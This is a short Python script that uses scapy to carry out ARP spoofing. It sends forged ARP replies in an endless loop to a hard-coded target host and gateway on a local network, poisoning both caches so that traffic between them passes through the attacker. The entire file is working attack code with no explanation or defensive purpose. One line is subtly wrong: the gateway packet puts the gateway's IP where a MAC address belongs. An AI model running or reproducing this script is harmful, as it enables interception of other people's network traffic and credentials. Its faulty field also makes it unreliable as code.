from scapy.all import *

target_ip = "192.168.31.15"
gateway_ip = "192.168.31.1"

target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)

print(f'{target_ip} : {target_mac}')
print(f'{gateway_ip} : {gateway_mac}')

target_packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
gateway_packet = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_ip)

while True:
    send(target_packet)
    send(gateway_packet)
    time.sleep(1)
